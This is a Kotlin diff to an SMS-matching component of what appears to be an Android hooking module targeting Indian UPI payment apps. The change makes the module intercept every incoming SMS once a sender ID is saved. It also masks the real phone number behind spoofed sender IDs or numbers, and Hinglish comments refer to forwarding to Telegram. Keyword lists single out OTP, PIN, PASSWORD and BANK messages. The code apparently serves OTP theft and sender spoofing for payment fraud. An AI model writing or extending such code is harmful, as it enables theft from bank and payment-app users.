@@ -7,12 +7,17 @@ import java.util.regex.Pattern
 object SmsMatcher {
 
     private val OTP_PATTERN = Pattern.compile("""\b(\d{4,8})\b""")
-    private val SENDER_ID_PATTERN = Pattern.compile("""^(AD|VM|JD|BP|TX|VK|AX|IC|PY|BZ)-[A-Z0-9]+(-S)?$""", Pattern.CASE_INSENSITIVE)
+    private val SENDER_ID_PATTERN = Pattern.compile(
+        """^(AD|VM|JD|BP|TX|VK|AX|IC|PY|BZ|JM)-[A-Z0-9]+(-S)?$""",
+        Pattern.CASE_INSENSITIVE
+    )
     private val DEFAULT_SENDER = "AD-TEST-S"
+    private val SENDER_PREFIXES = listOf("AD-", "VM-", "JD-", "BP-", "TX-", "JM-", "VK-", "AX-")
 
     fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
         UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }
 
+    /** MESSAGE tab Sender ID — AD-YESBNK-S, JM-UNTYBK-S, etc. */
     fun savedSenderId(config: ModuleConfig): String? {
         val id = config.injectSenderId.trim().uppercase()
         if (id.isBlank() || id == DEFAULT_SENDER) return null
@@ -34,25 +39,34 @@ object SmsMatcher {
         val hooked = enabledHookedApps(config)
         if (hooked.isEmpty()) return false
 
+        // 1) Hooked UPI app keyword match (sender ya body)
         if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
 
+        // 2) Sender ID set — koi bhi SMS intercept (dusre phone se bhi), display = Sender ID
         val savedId = savedSenderId(config)
-        if (savedId != null && senderMatches(peer, savedId) && isVerificationBody(body)) return true
+        if (savedId != null) return true
 
-        return isVerificationBody(body) && UpiAppRegistry.matchAmongByBody(hooked, body) != null
+        // 3) Verification OTP + hooked app body keyword
+        if (isVerificationBody(body) && UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true
+
+        return false
     }
 
+    /**
+     * Telegram / intercept — kabhi real phone number mat dikhao.
+     * Pehle saved Sender ID, phir carrier sender ID, phir spoof number.
+     */
     fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
         savedSenderId(config)?.let { return it }
         if (isAlphanumericSenderId(actualPeer)) return normalizeSender(actualPeer)
         val spoof = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
-        return spoof.ifBlank { normalizeSender(actualPeer) }
+        return spoof.ifBlank { "INTERCEPT" }
     }
 
     fun displaySenderId(config: ModuleConfig, actualSender: String): String {
         savedSenderId(config)?.let { return it }
         if (isAlphanumericSenderId(actualSender)) return normalizeSender(actualSender)
-        return normalizeSender(actualSender).ifBlank { DEFAULT_SENDER }
+        return DEFAULT_SENDER
     }
 
     fun senderMatches(actual: String, filter: String): Boolean {
@@ -71,7 +85,7 @@ object SmsMatcher {
     fun isAlphanumericSenderId(sender: String): Boolean {
         val s = normalizeSender(sender)
         if (SENDER_ID_PATTERN.matcher(s).matches()) return true
-        if (s.startsWith("AD-") || s.startsWith("VM-") || s.startsWith("JD-")) return true
+        if (SENDER_PREFIXES.any { s.startsWith(it) }) return true
         return s.any { it.isLetter() } && !isNumericSender(s)
     }
 
@@ -107,8 +121,8 @@ object SmsMatcher {
         if (isEncryptedToken(body)) return true
         val upper = body.uppercase()
         val keywords = listOf(
-            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO",
-            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "PASSWORD", "BANK"
+            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO", "YESBNK",
+            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "PASSWORD", "BANK", "UNTYBK"
         )
         return keywords.any { upper.contains(it) }
     }
